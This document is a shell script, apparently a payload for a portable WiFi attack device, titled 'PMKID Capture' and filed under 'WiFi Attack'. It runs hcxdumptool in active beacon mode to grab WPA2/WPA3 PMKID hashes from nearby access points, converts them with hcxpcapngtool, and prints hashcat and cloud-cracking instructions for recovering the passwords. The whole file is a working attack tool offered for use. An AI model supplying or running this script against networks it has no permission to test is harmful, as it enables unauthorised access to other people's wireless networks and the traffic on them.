#!/bin/sh
# Title: PMKID Capture
# Author: NullSec
# Description: Capture PMKID hashes for offline cracking
# Category: WiFi Attack

LOOT_DIR="/mmc/nullsec/pmkid"
mkdir -p "$LOOT_DIR"

echo "🔑 PMKID CAPTURE"
echo "━━━━━━━━━━━━━━━━"

[ ! -d "/sys/class/net/wlan0" ] && { echo "[!] wlan0 not found!"; exit 1; }

# Check for hcxdumptool
if ! which hcxdumptool >/dev/null 2>&1; then
    echo "[!] hcxdumptool not found!"
    echo "[*] Install: opkg install /mmc/packages/hcxdumptool*.ipk"
    exit 1
fi

echo -n "Capture duration in seconds [60]: "
read DURATION
DURATION=${DURATION:-60}

TIMESTAMP=$(date +%Y%m%d_%H%M)
PCAPNG_FILE="$LOOT_DIR/pmkid_$TIMESTAMP.pcapng"
HASH_FILE="$LOOT_DIR/pmkid_$TIMESTAMP.22000"

echo ""
echo "[*] Starting PMKID capture..."
echo "[*] This attacks WPA2/WPA3 without clients!"
echo ""

# Use hcxdumptool for PMKID capture
timeout $DURATION hcxdumptool -i wlan0 -o "$PCAPNG_FILE" --active_beacon --enable_status=15 2>&1

if [ -f "$PCAPNG_FILE" ]; then
    echo ""
    echo "[*] Converting to hashcat format..."
    
    if which hcxpcapngtool >/dev/null 2>&1; then
        hcxpcapngtool -o "$HASH_FILE" "$PCAPNG_FILE" 2>&1
        
        if [ -f "$HASH_FILE" ]; then
            HASH_COUNT=$(wc -l < "$HASH_FILE" | tr -d ' ')
            echo "[+] Captured $HASH_COUNT PMKID hash(es)"
        fi
    else
        echo "[!] hcxpcapngtool not found - raw pcapng saved"
    fi
    
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "🔑 PMKID CAPTURE COMPLETE"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "PCAPNG: $PCAPNG_FILE"
    [ -f "$HASH_FILE" ] && echo "Hashes: $HASH_FILE"
    echo ""
    echo "To crack on your computer:"
    echo "  hashcat -m 22000 $HASH_FILE wordlist.txt"
    echo ""
    echo "Or use online services:"
    echo "  - https://hashcat.net/cap2hashcat/"
    echo "  - Upload .22000 file to cloud cracking"
    
    if [ -f "$HASH_FILE" ] && [ "$HASH_COUNT" -gt 0 ]; then
        echo ""
        echo "=== Captured Hashes ==="
        cat "$HASH_FILE"
    fi
else
    echo "[!] No capture file created"
fi
